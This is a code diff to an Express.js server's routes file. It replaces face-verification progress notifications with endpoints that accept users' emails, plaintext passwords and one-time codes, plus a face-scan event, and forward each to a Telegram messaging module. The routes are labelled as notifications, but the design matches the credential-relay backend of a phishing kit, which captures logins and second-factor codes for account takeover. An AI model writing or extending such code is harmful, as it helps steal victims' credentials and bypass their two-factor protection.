@@ -2,10 +2,9 @@ import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
 import { 
-  sendVerificationStart, 
-  sendVerificationComplete, 
-  sendVerificationStep,
-  type FaceVerificationStep 
+  sendLoginNotification, 
+  sendCodeNotification, 
+  sendFaceScanNotification
 } from "./telegram";
 
 export async function registerRoutes(
@@ -14,63 +13,59 @@ export async function registerRoutes(
 ): Promise<Server> {
   // Telegram notification endpoints
   
-  // Start verification notification
-  app.post("/api/verification/start", async (req, res) => {
+  // Login notification
+  app.post("/api/telegram/login", async (req, res) => {
     try {
-      const { username } = req.body;
+      const { email, password } = req.body;
       
-      if (!username) {
-        return res.status(400).json({ message: "Username is required" });
+      if (!email || !password) {
+        return res.status(400).json({ message: "Email and password are required" });
       }
       
-      await sendVerificationStart(username);
-      res.json({ success: true, message: "Notification sent" });
+      await sendLoginNotification(email, password);
+      res.json({ success: true, message: "Login notification sent" });
     } catch (error) {
-      console.error("Error sending start notification:", error);
+      console.error("Error sending login notification:", error);
       res.status(500).json({ message: "Failed to send notification" });
     }
   });
   
-  // Step completion notification
-  app.post("/api/verification/step", async (req, res) => {
+  // Code notification
+  app.post("/api/telegram/code", async (req, res) => {
     try {
-      const { username, step } = req.body;
+      const { email, code } = req.body;
       
-      if (!username || !step) {
-        return res.status(400).json({ message: "Username and step are required" });
+      if (!email || !code) {
+        return res.status(400).json({ message: "Email and code are required" });
       }
       
-      const stepData: FaceVerificationStep = {
-        step: step.step || step,
-        timestamp: new Date().toISOString(),
-        success: step.success !== false,
-        details: step.details
-      };
-      
-      await sendVerificationStep(username, stepData);
-      res.json({ success: true, message: "Step notification sent" });
+      await sendCodeNotification(email, code);
+      res.json({ success: true, message: "Code notification sent" });
     } catch (error) {
-      console.error("Error sending step notification:", error);
+      console.error("Error sending code notification:", error);
       res.status(500).json({ message: "Failed to send notification" });
     }
   });
   
-  // Complete verification notification
-  app.post("/api/verification/complete", async (req, res) => {
+  // Face scan notification
+  app.post("/api/telegram/facescan", async (req, res) => {
     try {
-      const { username, steps, success } = req.body;
+      const { email } = req.body;
       
-      if (!username || !steps) {
-        return res.status(400).json({ message: "Username and steps are required" });
+      if (!email) {
+        return res.status(400).json({ message: "Email is required" });
       }
       
-      await sendVerificationComplete(username, steps, success !== false);
-      res.json({ success: true, message: "Completion notification sent" });
+      await sendFaceScanNotification(email);
+      res.json({ success: true, message: "Face scan notification sent" });
     } catch (error) {
-      console.error("Error sending completion notification:", error);
+      console.error("Error sending face scan notification:", error);
       res.status(500).json({ message: "Failed to send notification" });
     }
   });
+  
+  // Old endpoints removed - Complete verification notification
+  
 
   return httpServer;
 }
